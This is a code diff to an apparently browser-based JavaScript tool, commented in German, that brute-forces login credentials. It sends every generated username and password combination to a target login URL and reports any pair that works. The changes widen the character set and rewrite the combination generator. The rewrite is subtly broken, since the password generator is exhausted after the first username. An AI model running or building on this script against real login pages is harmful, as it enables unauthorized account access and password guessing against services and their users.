@@ -72,9 +72,9 @@
     </div>
 
     <script>
-        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789°!"§$%&/()=?`^+#<>|~\}][{@€,.;:';
         let attempts = 0;
-        const maxLength = 4; // Setze eine maximale Länge zum Testen
+        const maxLength = 4; // Maximale Länge für Benutzernamen und Passwörter
 
         const commands = {
             'bruteforce': function(args) {
@@ -103,16 +103,22 @@
             }
         };
 
-        function generateCombinations(length) {
-            if (length === 1) return chars.split('');
-            const smallerCombos = generateCombinations(length - 1);
-            const combinations = [];
-            for (const combo of smallerCombos) {
-                for (const char of chars) {
-                    combinations.push(combo + char);
+        function* generateCombinationGenerator(length) {
+            const combination = Array(length).fill(chars[0]);
+            while (true) {
+                yield combination.join('');
+                let position = length - 1;
+                while (position >= 0) {
+                    if (combination[position] === chars[chars.length - 1]) {
+                        combination[position] = chars[0];
+                        position--;
+                    } else {
+                        combination[position] = chars[chars.indexOf(combination[position]) + 1];
+                        break;
+                    }
                 }
+                if (position < 0) return;
             }
-            return combinations;
         }
 
         async function testLogin(url, username, password) {
@@ -140,23 +146,28 @@
             const outputElement = document.getElementById('output');
             let found = false;
 
+            // Teste alle Kombinationen von Benutzernamen und Passwörtern
             for (let length = 1; length <= maxLength; length++) {
-                const combinations = generateCombinations(length);
-                for (const combo of combinations) {
-                    attempts++;
-                    const [username, password] = [combo, combo]; // Beispielhaft: gleicher Wert für Username und Passwort
-                    outputElement.innerText += `\nVersuch ${attempts}: ${username}:${password}`;
-                    
-                    if (await testLogin(url, username, password)) {
-                        const end = performance.now();
-                        outputElement.innerText += `\nGefunden: ${username}:${password} in ${attempts} Versuchen und ${((end - start) / 1000).toFixed(2)} Sekunden.`;
-                        found = true;
-                        break;
+                const usernameGenerator = generateCombinationGenerator(length);
+                const passwordGenerator = generateCombinationGenerator(length);
+                
+                for (const username of usernameGenerator) {
+                    for (const password of passwordGenerator) {
+                        attempts++;
+                        outputElement.innerText += `\nVersuch ${attempts}: ${username}:${password}`;
+                        
+                        if (await testLogin(url, username, password)) {
+                            const end = performance.now();
+                            outputElement.innerText += `\nGefunden: ${username}:${password} in ${attempts} Versuchen und ${((end - start) / 1000).toFixed(2)} Sekunden.`;
+                            found = true;
+                            break;
+                        }
                     }
+                    if (found) break;
                 }
                 if (found) break;
             }
-            
+
             if (!found) {
                 const end = performance.now();
                 outputElement.innerText += `\nNicht gefunden in ${attempts} Versuchen und ${((end - start) / 1000).toFixed(2)} Sekunden.`;
